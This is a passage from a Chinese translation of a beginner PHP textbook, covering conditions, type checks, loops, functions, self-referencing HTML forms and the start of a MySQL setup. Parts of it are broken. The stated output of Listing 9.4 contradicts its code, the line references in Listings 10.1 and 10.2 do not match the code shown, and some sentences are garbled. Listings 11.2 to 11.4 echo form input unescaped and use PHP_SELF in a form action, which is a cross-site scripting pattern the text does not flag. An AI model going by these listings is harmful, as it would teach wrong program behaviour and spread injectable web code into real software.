### 清单 7.7

```
1. $letter_grade = NULL;
2.
3. if ($score >= 80)
4. {
5.   if ($score <= 90)
6.   {
7.     $letter_grade = 'B';
8.   }
9. }
```

更好、更可读的解决方案是使用逻辑运算符 `&&` 来消除内部的 `if`：

```
$letter_grade = NULL;

if ($score >= 80 && $score <= 90)
{
    $letter_grade = 'B';
}
```

使用逻辑与来创建复合条件语句通常用于匹配包含范围的值。相反，当你想排除某个范围时，则使用逻辑或来创建复合条件语句。考虑这样一个问题：对儿童或老年人给予九折（10% 折扣）。在这个例子中，我们随意规定：年龄在 18 岁以下为儿童，55 岁及以上为老年人：

```
$child_or_senior_discount_applies = false;

if ($age < 18 || $age >= 55)
{
    $child_or_senior_discount_applies = true;
}
```

## 7. 真值、比较、条件与复合条件

### 练习

为以下要求创建一个脚本 `comparisons.php`：

- 1. 使用 $x = random_int(1,10) 选取一个 1 到 10 之间的数字。输出 $x 的值，然后指出它是否在 3 到 7（含）之间。
- 2. 使用 $x = random_int(1,10) 选取一个 1 到 10 之间的数字。输出 $x 的值。指出它是小于 3、在 3 到 7（含）之间，还是大于 7。
- 3. 使用复合条件语句重做上一练习。

## 第 8 章

## 验证变量与类型检查

> “C 程序就像是一群拿着剃刀的人在新打蜡的舞池上快舞。”
> 
> ——沃迪·拉文斯

## 8. 验证变量与类型检查

### 验证变量

PHP 最常用于开发 Web 应用程序。因此，你需要获取表单条目中的数据。出于安全原因和标准实践，你需要验证此输入的内容。也许你想检查用户是否在字段中输入了任何内容。你可以使用 `==` 来检查空字符串，但最好使用 PHP 内置函数 `isset()`[1] 和 `empty()`[2]。`isset()` 检查变量是否存在且已设置。`empty()` 检查变量是否有任何内容。参见清单 8.1。

### 清单 8.1

```php
<?php
$word1 = 'flibertigibbits'; // $word1 is set, but not empty
$word2 = '';               // $word2 is set, but it is also empty

if (isset($word1))
{
    echo '$word1 is set<br />';
}
else
{
    echo '$word1 is NOT set<br />';
}

if (empty($word1))
{
    echo '$word1 is empty<br />';
}
else
{
    echo '$word1 is NOT empty<br />';
}

if (isset($word2))
{
    echo '$word2 is set<br />';
}
else
{
    echo '$word2 is NOT set<br />';
}
```

[1] isset(): https://php.net/isset
[2] empty(): https://php.net/empty





```
32. if (empty($word2))
33. {
34.     echo '$word2 is empty<br />';
35. }
36. else
37. {
38.     echo '$word2 is NOT empty<br />';
39. }
40.
41. if (isset($word3))
42. {
43.     echo '$word3 is set<br />';
44. }
45. else
46. {
47.     echo '$word3 is NOT set<br />'; // $word3 不存在，因此未被设置
48. }
49.
50. if (empty($word3))
51. {
52.     echo '$word3 is empty<br />'; // $word3 被视为空，尽管它不存在
53. }
54. else
55. {
56.     echo '$word3 is NOT empty<br />';
57. }
```

输出如下：

```
$word1 is set
$word1 is NOT empty
$word2 is set
$word2 is empty
$word3 is NOT set
$word3 is empty
```

## 验证与检查变量类型

由于 PHP 是一种动态类型语言，你可能还需要使用一些内置函数[^3]来验证 PHP 变量的类型：

| 函数 | 检查的类型 | 说明 |
|---|---|---|
| `is_bool()` | 布尔型 | 若参数为布尔值，则返回 true |
| `is_int()` | 整型 | 若参数为整数，则返回 true |
| `is_float()` | 浮点型 | 若参数为浮点数，则返回 true |
| `is_string()` | 字符串型 | 若参数为字符串，则返回 true |
| `is_scalar()` | 标量数据类型 | 若参数为上述任一种标量类型，则返回 true |

清单 8.2 展示了如何检查类型。

清单 8.2.

```php
<?php
$bool_value = false;
$int_value = 42;
$float_value = 37.4;
$string_value = "The answer to life, the universe, and everything";

if (is_bool($bool_value))
{
    echo '$bool_value IS a boolean data type<br/>';
}

if (is_int($int_value))
{
    echo '$int_value IS an integer data type<br/>';
}

if (is_float($float_value))
{
    echo '$float_value IS a floating point data type<br/>';
}

if (is_string($string_value))
{
    echo '$string_value IS a string data type<br/>';
}
```

[^3] 内置函数：https://php.net/book.var

这段代码输出如下：

```
$bool_value IS a boolean data type
$int_value IS an integer data type
$float_value IS a floating point data type
$string_value IS a string data type
```

清单 8.3 是一个检查变量是否为标量类型的示例。

## 清单 8.3.

```
1. <?php
2. 
3. $a_word = "serendipity";
4. $some_words = array("some", "random", "words");
5. 
6. if (is_scalar($a_word))
7. {
8.     echo '$a_word IS a scalar variable<br/>';
9. }
10. 
11. if (!is_scalar($some_words))
12. {
13.     echo '$some_words IS NOT a scalar variable<br/>';
14. }
```

输出如下：

```
$a_word IS a scalar variable
$some_words IS NOT a scalar variable
```

> 请注意，布尔型、整型、浮点型和字符串型都是标量类型。数组、对象、可调用类型和资源则不是。

有时使用 gettype()[4] 来确定变量的类型也很方便。请看以下代码，它输出一个包含几种 PHP 变量类型、它们的值以及 gettype() 响应的 HTML 表格。参见清单 8.4。

[4] gettype()：https://php.net/gettype

## 8. 验证变量与类型检查

清单 8.4.

```
1. <?php
2.
3. class Car {}
4.
5. $boolean = true;
6. $integer = 123;
7. $integer_negative = -13;
8. $float_double = 12.35;
9. $string = "Hello World";
10. $array = array('one', 'fish', 'two', 'fish', 'red', 'fish');
11. $object = new Car();
12. $null = NULL;
13. ?>
14.
15. <table border='1px solid;'>
16.     <tr>
17.         <th>类型</th>
18.         <th>值</th>
19.         <th>gettype() 响应</th>
20.     </tr>
21.     <tr>
22.         <td>布尔型</td>
23.         <td><?= $boolean ?></td>
24.         <td><?= gettype($boolean); ?></td>
25.     </tr>
26.     <tr>
27.         <td>整型</td>
28.         <td><?= $integer ?></td>
29.         <td><?= gettype($integer); ?></td>
30.     </tr>
31.     <tr>
32.         <td>负整型</td>
33.         <td><?= $integer_negative ?></td>
34.         <td><?= gettype($integer_negative); ?></td>
35.     </tr>
36.     <tr>
37.         <td>浮点型</td>
38.         <td><?= $float_double ?></td>
39.         <td><?= gettype($float_double); ?></td>
40.     </tr>
41.     <tr>
42.         <td>字符串型</td>
43.         <td><?= $string ?></td>
44.         <td><?= gettype($string); ?></td>
45.     </tr>
46.     <tr>
47.         <td>数组</td>
48.         <td><?= implode(',', $array); ?></td>
49.         <td><?= gettype($array); ?></td>
50.     </tr>
```

```
51. <tr>
52.   <td>对象</td>
53.   <td><?php print_r($object); ?></td>
54.   <td><?= gettype($object); ?></td>
55. </tr>
56. <tr>
57.   <td>Null</td>
58.   <td><?php print_r($null); ?></td>
59.   <td><?= gettype($null); ?></td>
60. </tr>
61. </table>
```

图 8.1 显示了输出结果。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_91_0.png)

## 练习

创建一个 types.php 脚本，完成以下任务：

- 1. 编写并运行清单 8.4 中使用 gettype() 的代码。
- 2. 修改清单 8.4 中变量的值，再次运行，观察输出是否变化。

## 第 9 章

## 循环

> > “他们再也造不出像 Bunny 这样的 Bug 了。”
> 
> > —— Olav Mjelde

## 9. 循环

在 PHP 中，循环用于按预定次数运行一段代码，或一直运行到满足特定条件为止。按预定次数循环时，这种循环称为计数循环。我们不知道代码块会重复多少次，但知道结束重复的条件，这种状态称为哨兵循环。

PHP 中有四种循环结构：

- 1. `for`
- 2. `while`
- 3. `do/while`
- 4. `foreach`

for 和 while 循环是所有编程语言中最常见的循环结构。

## 计数循环

for 和 foreach 被认为是计数循环。它们根据计数器变量或集合中项目的数量来重复执行一段代码。

## for 循环

for 循环有三个子句，用两个分号（;）分隔。我们称第一个子句为“初始化器”。它只在第一次遇到循环时执行。第二个子句称为“条件”，每次编译器遇到循环时都会执行。最后一个子句称为“增量器”，用于在完成一次循环迭代后递增或递减变量。

语法如下：

```php
for (_初始化器_; _条件_; _增量器_)
{
    _要执行的代码_
}
```

清单 9.1 是一个简单的 for 循环，它将一个变量加十，重复十次。

## 清单 9.1.

```
1. $looping_value = 0;
2. $counter;
3.
4. for ($counter = 0; $counter < 10; $counter++)
5. {
6.     $looping_value += 10;
7. }
8.
9. echo "经过 $counter 次循环后，looping_value = $looping_value";
```

输出如下：

```
经过 10 次循环后，looping_value = 100
```

需要注意的是，在循环中递增变量时，要递增的变量（此处为 $looping_value）必须进行初始化。否则，最终结果会是一个 NULL 值。这个错误在循环中很常见。另外，请注意增量器（此处为 $counter）最终会变成 10，因为循环最后一次成功迭代会将变量递增到下一个值。这个最终值导致循环退出——此时增量器不再满足条件表达式的 true 条件。

## foreach 循环

foreach 循环是一种便捷的方式，可以遍历数组中的所有值，而无需为每个数组项设置索引。foreach 循环有两个值，用关键字 as 分隔。第一个值是你要遍历的实际数组。第二个值是一个任意变量名，用于从头到尾访问数组的每个元素。

语法如下：

```
foreach (_数组_ as _数组元素_)
{
    _要执行的代码_
}
```

下面是一个简单的 foreach 循环，它输出数组中的每个值：

```
$colors = array('red', 'green', 'blue', 'orange');

foreach ($colors as $color)
{
    echo "当前颜色是 $color<br/>";
}
```

## 9. 循环

该循环产生以下输出：

```
当前颜色是 red
当前颜色是 green
当前颜色是 blue
当前颜色是 orange
```

## 哨兵循环

while 和 do/while 是哨兵循环。它们会一直执行，直到某个条件为 false。

## while 循环

初学循环的新程序员首先会学习如何使用 while 循环，因为它只有一个子句，是最容易创建的循环。事实上，它通常以计数循环的形式出现：

```
$looping_value = 0;
$counter = 0;

while ($counter < 10)
{
    $looping_value += 10;
    $counter++;
}
```

然而，这个示例并不是 while 循环的最佳用法，因为程序员必须单独初始化计数器变量，然后记得在循环底部递增计数器变量。for 循环才是为计数循环而设计的。

> 确保循环能够终止至关重要。否则，你会创建无限循环，只有达到 PHP 的最大执行时间时才会结束。

while 循环的正确用法是持续执行一段代码，直到某个特定事件发生。

假设我们有一个 MySQL 数据库，其中包含一个存储产品信息的表。假设我们想要输出表中每一行的产品名称和单价，但我们不知道表中有多少行。我们只希望全部输出。




PHP 提供了多个用于在 MySQL 数据库中存储和检索数据的函数。查询数据库时，我们会得到一个关联数组作为返回结果，其中包含整个结果集。这个结果集需要传递给一个函数（mysqli_fetch_array()），该函数以关联数组的形式返回记录集中下一行，使用字段名作为元素引用来表示该行包含的值。每次后续调用 mysqli_fetch_array() 都会返回下一行，直到记录集中不再有剩余行。当记录集中没有更多行时，会返回 NULL，这使你能够退出循环。清单 9.2 是一个 while 循环的示例。

## Listing 9.2.

```html
<html>
<head>
  <title>Fetching Multiple Rows</title>
</head>
<body>
<?php
  $dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'northwind')
  or trigger_error('Error connecting to MySQL server.', E_USER_ERROR);

  $query = "SELECT ProductName, UnitPrice FROM Products";

  $result = mysqli_query($dbc, $query)
  or trigger_error('Error querying database.', E_USER_ERROR);
?>
<table border='1px solid;'>
  <tr><th>Product Name</th>
  <th>Unit Price</th></tr>
<?php
  while($row = mysqli_fetch_array($result))
  {
    echo '<tr><td>' . $row['ProductName'] . '</td><td>'
    . $row['UnitPrice'] . '</td></tr>';
  }
  mysqli_close($dbc);
?>
</table>
</body>
</html>
```

## 9. 循环

图 9.1 显示了使用 while 循环从数据库中获取的产品信息表。

> 我们将在后续章节中探讨创建和使用函数以及与数据库协作的内容。

do/while[1] 循环在你能保证至少进入一次循环时很有帮助。在 PHP 中，你很少能保证这一条件。因此它很少被使用。

### 退出和继续循环

有时，你可能希望提前退出循环，或者继续迭代循环但跳过当前迭代剩余部分的某些代码执行。PHP 为此提供了 break 和 continue 命令。

### break

如果你想退出循环，请在循环中使用 break 命令。清单 9.3 是一个示例，如果数组中的元素等于 finished，则退出 foreach 循环。

### Listing 9.3.

```php
<?php
$random_words = ['happy', 'sad', 'finished', 'anxious', 'ecstatic'];
foreach ($random_words as $word) {
    if ($word == 'finished') {
        break;
    }
    echo "$word<br/>";
}
```

以下是输出：

```
happy
sad
```

[1] do/while: http://php.net/control-structures.do.while

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_98_0.png)

### continue

如果你想跳过当前迭代的剩余部分并继续下一轮迭代，请在循环中使用 continue 命令。参见清单 9.4，其中给出了一个跳过循环中每第三次迭代的示例。

### Listing 9.4.

```php
<?php
$random_words = ['one', 'two', 'three', 'anxious', 'ecstatic'];

for ($i = 1; $i <= 9; $i++)
{
    if ($i % 3)
    {
        continue;
    }

    echo "$i<br/>";
}
```

此循环产生以下输出：

```
1
2
4
5
7
8
```

### 练习

为以下内容创建脚本 loops.php：

- 1. 编写一个循环，从一数到十并在一列中输出每个值。在第二列中，输出该数字的平方。
- 2. 使用 foreach 循环输出第 6 章 arrays.php 中的图书标题列表。

## 章节

## 10

## 函数

> “在水上行走和根据规范开发软件都很简单，如果两者都被冻结的话。”
> 
> – Edward V. Berard

## 10. 函数

编写代码并持续添加功能非常容易。问题是我们的程序代码变得过大且难以管理。常见的做法是将代码模块化为函数并将功能限制为特定任务。这样做使我们能够在整个程序中重用这些模块。函数还使我们能够传入参数并返回结果。

### 简单函数

最简单的函数不接受参数也不返回任何内容；它只是执行某些功能。假设你想要一个函数来输出你在网站的每个页面上显示的问候语“Welcome to my Website!” 它可能看起来像这样：

```
function outputGreetingToWebsite()
{
    echo "<h1>Welcome to my Website!</h1>";
}
```

在 PHP 中创建函数时，你总是使用 function 关键字开始。接下来，你需要为函数取一个好名字。由于函数是被调用来执行某事的，通常最好以动词开头命名函数。在本例中，我们希望向网站输出问候语。将函数命名得尽可能具体有助于代码的可读性和可维护性。因此 outputGreetingToWebsite 是一个好名字。虽然 PHP 标准中未明确规定，但我通常喜欢使用一种称为“驼峰命名法”的方式命名函数。如上例所示，我们使用小写字母开始函数的第一个单词，然后将每个后续单词与函数连接在一起时，将连接单词的首字母大写。接下来，函数在括号之间定义传递给函数的参数。在本例中，我们没有参数要传递，所以我们将只使用空括号。接下来，函数内的代码包含在两个大括号 ({}) 中。此外，每次遇到新的左大括号时，你都希望缩进代码。我通常使用四个空格作为缩进级别，并对行续行使用双倍缩进（八个空格）。

组织我们的函数也是一个好主意。稍后，当我谈到面向对象编程时，我们会将函数（称为方法）放入称为“类”的东西中。现在，让我们假设我们有多个用于向网站输出信息的函数，收集在一个名为 outputToWebsite.php 的单个 PHP 脚本中。

当我们想在代码的其他地方（例如在另一个 PHP 脚本中）调用或使用我们的函数时，我们需要做几件事。首先，我们需要确保包含定义函数所在的代码。我们使用 require_once() 语句来做到这一点，并将包含我们想要使用的函数的脚本名称放在引号内：

```
<?php
require_once('outputToWebsite.php');
```

接下来，我们调用函数。下面示例中，让我们调用它两次：

```
outputGreetingToWebsite();
outputGreetingToWebsite();
```

调用函数两次的输出如 图 10.1 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_103_0.png)

### 函数参数/参数

函数也可以接受参数。假设我们想要创建一个函数，将两个数字作为参数传递给函数。让我们将此函数命名为 addTwoNumbers。我们需要在括号之间用逗号分隔两个参数。这些变量是函数的参数，并且被视为作用域限定于函数的局部变量。同样，给这些参数命名时尽可能描述性也是一个好主意：

```
function addTwoNumbers($num1, $num2)
{
    $sum = $num1 + $num2;
    echo "$num1 + $num2 = $sum<br />";
}
```

当我们调用此函数时，我们需要在与函数中定义相同的顺序下向此函数传入两个参数：

```
addTwoNumbers(4, 5);
```

这导致输出：

```
4 + 5 = 9
```

## 10. 函数

这在传入变量时也适用：

```
$the_first_number = -2;
$the_second_number = 5;
addTwoNumbers($the_first_number, $the_second_number);
```

输出结果为：

```
-2 + 5 = 3
```

调用函数时，传入的值被视为函数的参数。然而，从函数的角度来看，这些值被视为参数。我不认为这点计算机科学知识会让你在混淆这两种观点时遇到麻烦。当你调用函数时，参数的值（无论是字面值还是变量值）都会被复制到函数的参数变量中。

### 从函数返回值

最后，我们可以编写函数使其向我们返回结果。在上述加两个数字的示例基础上，让我们修改此函数。不是回显函数的结果，我们可以返回结果并允许调用函数的代码自行决定如何处理结果。首先，让我们将此函数的名称改为 sum，因为这更准确地描述了函数的功能。我们需要对代码做的唯一修改是将 echo 语句替换为返回变量 $sum：

```
function sum($num1, $num2)
{
    $sum = $num1 + $num2;
    return $sum;
}
```

现在当我们调用此函数时，我们可以创建一个变量来保存调用结果，并将其设置为等于函数调用：

```
$first_num = 5;
$second_num = 7;

$sum_of_two_numbers = sum($first_num, $second_num);
echo "The result of adding $first_num and $second_num is $sum_of_two_numbers<br/>";
```

这将产生以下输出：

```
The result of adding 5 and 7 is 12
```

> 如果函数返回一个结果，而你没有将该结果赋值给变量，那么该结果将丢失。

## 关于编写良好函数的进一步建议

在本章即将结束之际，我想就编写良好函数给出一些建议。编写函数颇具技巧性，与其说是科学，不如说是一门艺术，但其中90%也是常识。让我们看看一些关于编写高可读性和高可维护性函数的建议。

### 全局变量是邪恶的！

无论怎样强调全局变量的邪恶都不为过。全局变量的问题是，你的所有代码（至少是单个脚本内的代码）都可以访问它并修改其值。这种做法使调试和维护变得困难。不幸的是，它是规避合理设计的懒散替代方案。

在软件设计中，限制函数之间的数据交换是一种最佳实践。换句话说，我们通过参数将数据传入函数，并通过返回值从函数中获取数据，而不影响程序的其他部分。在 PHP 中，你不应该在函数或方法内部使用 `global` 关键字。

### 唯一良好的全局变量是常量

这并不是说你不能或不应该有任何全局值。常量值是全局值的一种良好用途，因为任何需要它们的代码都可以访问它们。然而，由于它是常量，所以不能改变。此外，你需要注意将全局常量的数量限制在所需范围内。

### 变量作用域

变量作用域定义为你的代码中哪些部分可以访问哪些变量。全局作用域是外部或最顶层的级别。

## 10. 函数

### 作用域运算符（{}）

在 PHP（以及大多数其他编程语言）中，我们使用作用域运算符（{}）来限制变量的作用域。例如，所有函数代码都包含在一组作用域运算符中：

```php
function sum($num1, $num2)
{
    $sum = $num1 + $num2;
    return $sum;
}
```

> 在上述示例中，参数 $num1 和 $num2 是在函数签名中、函数作用域运算符之外定义的。然而，由于我们在定义函数，这些参数仅在函数作用域运算符内具有作用域——即保存值。在 for() 循环内定义的变量也是如此。

因此，在一组作用域运算符内创建的变量只能由这些作用域运算符内的代码直接访问。然而，在作用域运算符之外定义的变量（以及常量）可以被作用域运算符内的代码访问。请考虑清单 10.1 中的示例。

### 清单 10.1.

```php
<?php

function doSomething()
{
    $value1 = 10;

    if ($value1 >= 10)
    {
        $value2 = $value1;
    }
    else
    {
        $value3 = $value1;
    }

    echo $value2; // This outputs an undefined value
}
```

在上面的代码中，第 9 行的 $value2 可以访问 $value1，因为 $value1 在 $value2 的作用域内。第 13 行的 $value3 也是如此。然而，在第 16 行，我们创建了一个名为 $value2 的新变量，因为第 9 行创建的那个变量在遇到第 10 行的闭合作用域运算符后已超出作用域。第 16 行输出 $value2 的结果是未定义的。

### 标量按值传递

在 PHP 中，参数按值（即副本）传递给函数。因此，你无法修改传入的变量。参数的值会被复制到形参中。考虑以下函数及其调用。参见清单 10.2。

### 清单 10.2.

```php
<?php
function incrementValueNotWorking($value)
{
    $value++;
}
$number = 42;
echo "Before function call: $number<br/>";
incrementValueNotWorking($number);
echo "After function call: $number";
```

由于标量值是按值传递的，第 9 行和第 13 行中 $number 的输出是相同的，因此无法递增 $number。如果我们像清单 10.3 那样重写代码，会发生什么？

### 清单 10.3.

```php
<?php
function incrementValue($value)
{
    $value++;
    return $value;
}
$number = 42;
echo "Before function call: $number<br/>";
$number = incrementValue($number);
echo "After function call: $number";
```

现在，第 15 行 $number 的输出将比第 11 行的大 1。

### 函数应只做一件事，并且只做一件事。

设计函数时，请确保它们只做一件事。首先，这降低了代码的复杂度；其次，它提高了代码的可重用性。

### 完整且简洁地命名你的函数。

在编程的早期，由于可用的程序代码内存有限，我们无法奢侈地充分命名函数。我记得自己坐在地板上，面对一摞摞打印出来的代码，试图解读名为 x 和 y 的函数含义，就像在使用秘密解码环一样。如今，没有理由不给函数起个好名字。

你希望函数的命名完整而简洁，因为这会让你的代码具有自文档性。例如，如果我要编写一个计算员工州所得税的函数，那么一个好的函数名可能是：`calculateEmployeeStateIncomeTax()`。我知道这名字很长，但该函数的意图毫无歧义。

如前所述，一个可遵循的好模板是使用“动词+名词”并视需要加入形容词来命名函数。如果你的函数返回布尔值 `true` 或 `false`（即函数回答一个问题），请考虑将其命名为类似 `isX()` 或 `hasY()` 的形式。在你参与的项目中寻找其他类似约定。例如，有些项目使用 `fetchQ()` 来表示与数据库或外部 API 交互的方法。

### 练习

为以下内容创建一个脚本 `functions.php`：

- 1. 创建函数来对两个数进行加、减、除、乘运算，并返回结果。输出每次运算的结果以及两个输入值。
- 2. 创建一个接受两个参数的函数：一个总额和一个以百分比表示的销售税率（因此 5% 的销售税率表示为 0.05）。返回总额应缴纳的销售税。然后输出总额、税率和应缴销售税。

## 第 11 章

## 使用 HTML 表单

> > “调试代码的难度是编写代码的两倍。因此，如果你尽可能巧妙地编写代码，那么按定义来说，你还不够聪明去调试它。”
> > 
> > ——布莱恩·W. 克尼汉

## 处理我们的表单并将输出返回网页

表单提交后，浏览器将表单数据发送到我们的 `postfullname.php` 脚本。在这里，我们获取表单数据，从中生成问候语，然后将其显示在网页上。

假设我在“名”中输入“Ken”，在“姓”中输入“Marks”，我希望问候语看起来像图 11.2 所示。我们的 `postfullname.php` 脚本如清单 11.2 所示。

清单 11.2.

```
1. <html>
2. <head>
3. <title>Full Name</title>
4. </head>
5. <body>
6. <h2>Greetings!</h2>
7. <?php
8. $first_name = $_POST['first_name'];
9. $last_name = $_POST['last_name'];
10. 
11. echo "Hello " . $first_name . " " . $last_name . ". Thanks for submitting the form!";
12. ?>
13. </body>
14. </html>
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_111_0.png)

我希望你注意几点。首先，PHP 被设计为可与 HTML 混合使用。你可以轻松地在 PHP 和 HTML 之间切换。其次，如果脚本中包含任何 PHP 代码，你需要使用 `.php` 扩展名来命名脚本。

### $_POST 超全局变量

`$_POST` 是 PHP 内置的一个特殊变量，用于保存表单数据，并且在 HTTP POST 后，它可在你的整个脚本集中使用。`$_POST` 是一个关联数组。你可以通过使用表单中的 `name` 属性作为关联键，访问 `$_POST` 超全局数组中的表单数据。

查看 `postfullname.php` 脚本，你会看到 `$_POST['first_name']` 来自 `postfullname.html` 中由 `first_name` 标识的 input 元素的 `name` 属性（`<input name="first_name"/>`）。同样，`$_POST['last_name']` 来自由 `last_name` 标识的 input 元素的 `name` 属性（`<input name="last_name"/>`）。

你还会注意到，我将 `$_POST['first_name']` 和 `$_POST['last_name']` 赋值给了局部变量。这样做并非必需，但通常有助于提高代码的可读性。我想指出，使用 `echo` 向网页输出 HTML 应当被使用。




## 11. 使用 HTML 表单

使用 echo 生成 HTML 输出可能会很繁琐，因此应谨慎使用。清单 11.3 是我们的 postfullname.php 脚本的一个修改示例，展示了另一种在 HTML 和 PHP 之间切换以输出 HTML 的方法。

清单 11.3.

```php
1. <html>
2.   <head>
3.     <title>Full Name</title>
4.   </head>
5.   <body>
6.     <h2>Greetings!</h2>
7.     Hello <?= $_POST['first_name'] . " " . $_POST['last_name'] ?>
8.     Thanks for submitting the form!
9.     <br/>
10.    <?php print_r($_POST) ?>
11.  </body>
12. </html>
```

我们使用 PHP 短标签 `<?=`，而不是使用 echo。该语法是 `<?php echo` 的简写形式，极为方便，因为你很可能在将数据转换为 HTML 输出之前，使用 PHP 处理数据。

关于这个简化示例，还有一点需要注意：我删除了局部变量，并使用 `$_POST` 超全局变量直接访问相应元素。

最后一点关于使用 `$_POST` 超全局变量或一般数组操作的说明。通常你需要检查数组的内容。例如，你可能想知道是否从表单中获得了预期内容。你可以使用浏览器自带的开发者工具（大多数开发者都这样做），但这只能显示客户端将发送什么。在你开发 PHP 脚本时，快速输出数组内容会非常方便。你可以使用函数 print_r()[1] 轻松做到这一点。

如果我在上述脚本的结束 `</body>` 标签之前添加以下行，就会得到如图 11.3 所示的输出。

```html
    <br/>
    <?php print_r($_POST) ?>
</body>
</html>
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_112_0.png)

图 11.3.

[1] print_r(): https://php.net/print_r

### 使用自引用页面进行清理

运行这个小型的 Web 程序时，需要注意一点：我们首先导航到包含表单的 URL。然后提交表单后，我们再导航到包含 PHP 代码的第二个页面。我们不必这样做。如果能在某个脚本中包含整个表单，并在用户准备提交表单时再运行自身，那会更好。

我们可以通过创建所谓的自引用页面来实现这一点。为此，我们需要使用 PHP 提供的另一个超全局变量，它引用当前网页的 URL，即 `$_SERVER['PHP_SELF']`。

让我们使用上面的示例，向输入名字和姓氏的用户输出问候语。

该脚本由两部分组成：表单和问候语的输出。对于这个程序，我们首先要输出表单。然后当用户提交表单时，我们希望在输出问候语时不再显示表单。请注意，有些设计会让你在提交后再次输出问候语和表单，但在这个示例中，我们希望用户提交后只输出问候语而不显示表单。

这种行为需要一点条件逻辑（if/else），因此我建议绘制一个简单的决策树或编写一些伪代码：

```text
IF user submitted form
    Output greeting with first and last name.
ELSE
    Output first and last name form
END IF
```

清单 11.4.

```php
1. <html>
2.   <head>
3.     <title>Form for Entering Full Name</title>
4.   </head>
5.   <body>
6.     <?php if (!isset($_POST['submit'])) { ?>
7.       <h2>Enter Full Name</h2>
8.       <form action="<?= $_SERVER['PHP_SELF'] ?>" method="POST">
9.         First name:<br/>
10.        <input name="first_name"/><br/>
11.        Last name:<br/>
12.        <input name="last_name"/><br/>
13.        <p>
14.          <input type="submit" name="submit" value="Submit Name" />
15.        </form>
16.    <?php } else { ?>
17.      <h2>Greetings!</h2>
18.      Hello <?= $_POST['first_name'] . " " . $_POST['last_name'] ?>
19.      Thanks for submitting the form!
20.    <?php } ?>
21.  </body>
22. </html>
```

上述代码根据用户是否提交了表单，来决定 HTML 文档主体中显示的内容。当该页面第一次渲染时，用户尚未提交表单，因此 `$_POST['submit']` 不会被设置。因此，第一个 if 语句中的所有 HTML（即显示表单的部分）都会渲染到页面上。而 else 语句中的 HTML 则不会被渲染。

一旦用户提交表单，浏览器就会将 HTTP POST 请求发送到完全相同的脚本（这从表单的 action 属性设置为 `$_SERVER['PHP_SELF']` 可以看出）。脚本从头开始执行。然而，当接下来执行 if 语句时，条件为假，因为用户确实提交了表单，并且 `$_POST['submit']` 现在已经被设置了。

此时，else 语句中的代码和 HTML 将分别执行和渲染，从而在网页上输出问候语（而不是表单）。

顺便提一下，`$_SERVER`[2] 是 PHP 提供的又一个超全局关联数组。它包含有关 Web 服务器和执行环境的信息。使用其内容时要小心，因为内容取决于你使用的服务器及其配置方式。

[2] $_SERVER: http://php.net/reserved.variables.server

### 练习：BadLibs，第 1 部分

- 1. 创建自引用的 postfullname.php 脚本，并确保它能正常工作。
- 2. 创建“BadLibs”第 1 部分程序。

本练习基于流行的填空单词游戏。编写一个简单的 Web 应用程序，其表单接受一个名词、一个动词、一个形容词和一个副词。一旦用户提交表单，你的应用程序就应将名词、动词、形容词和副词组合成一个有趣的句子或由你创作的一段短文。为了增加挑战性，可以考虑将其做成自引用表单，并通过使用更多的名词、动词、形容词和副词等，编写一个更长的故事/段落。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_115_0.png)

图 11.4 是一个可能外观的示例。

图 11.5 是输出的一个示例。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_115_1.png)

## 第 12 章：向 MySQL 数据库插入数据

> “很长一段时间里，我一直困惑不解：为什么一样东西如此昂贵、如此前沿，却可能如此无用。后来我意识到，计算机是一台愚蠢的机器，却有能力做极其聪明的事情；而计算机程序员是聪明的人，却有能力做极其愚蠢的事情。简而言之，他们完美匹配。”
> 
> ——比尔·布莱森

关于如何将 SQL 与 MySQL 配合使用的参考指南，请查阅 MySQL 文档[2]——目前在 Ubuntu LTS 发行版中为 8.0 版本。你很可能还会对 SQL 语句语法[3]感兴趣。

你可以通过在 Bash shell（而非 MySQL CLI）中键入以下命令，快速识别你的 MySQL 安装版本。你应该会看到类似于图 12.2 的输出。

```text
mysql --version
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_119_0.png)

### 创建“Northwind”数据库

为了演示 MySQL 的某些功能，让我们下载一个著名的示例数据库，这是微软多年前创建的，用于教授人们如何使用 Access 数据库应用程序。此后，它已被移植以支持 IIS 和 MySQL。Northwind 数据库保存着名为“Northwind Traders”的虚构公司的销售、库存和员工数据。

首先，我们需要使用 SQL 创建一个空数据库。为此，请在 MySQL CLI 工具中键入以下命令（图 12.3）。

```sql
CREATE DATABASE northwind;
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_119_1.png)

如果你输入正确，应该会看到一条 Query OK, 1 row affected 消息。

在第 2 章中，我们创建了一个名为 testuser 的用户。让我们授予 testuser 对 northwind 数据库的权限。输入以下命令（图 12.4）。

```sql
GRANT ALL PRIVILEGES ON northwind.* TO 'testuser'@'localhost';
```

输入 exit 退出 MySQL CLI 工具，然后返回 Bash shell：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_119_2.png)

[2] MySQL 文档: https://dev.mysql.com/doc/refman/8.0/en/
[3] SQL 语句语法: https://dev.mysql.com/doc/refman/8.0/en/sql-statements.html




## 12. 向 MySQL 数据库插入数据

### 加载 Northwind 数据库

Northwind 数据库包含在两个 SQL 文件中；一个包含模式，第二个包含数据。可以从以下位置下载：

- https://raw.githubusercontent.com/jpwhite3/northwind-MySQL/master/northwind.sql
- https://raw.githubusercontent.com/jpwhite3/northwind-MySQL/master/northwind-data.sql

你可以使用 Bash shell 中的 wget 下载它们。我喜欢将文件下载到我的主文件夹下的 Downloads 文件夹中。一旦你导航到想要下载 Northwind SQL 文件的文件夹，输入以下命令：

```bash
wget https://raw.githubusercontent.com/jpwhite3/northwind-MySQL/master/northwind.sql
wget https://raw.githubusercontent.com/jpwhite3/northwind-MySQL/master/northwind-data.sql
```

下载文件并执行目录列表（ls）后，你将看到图 12.6 所示的输出。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_120_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_120_1.png)

现在让我们通过将键盘的 Unix 标准输入重定向到我们下载的文件，将 Northwind SQL 模式和数据文件导入 MySQL CLI 工具，输入以下命令在 Bash shell 中：

```bash
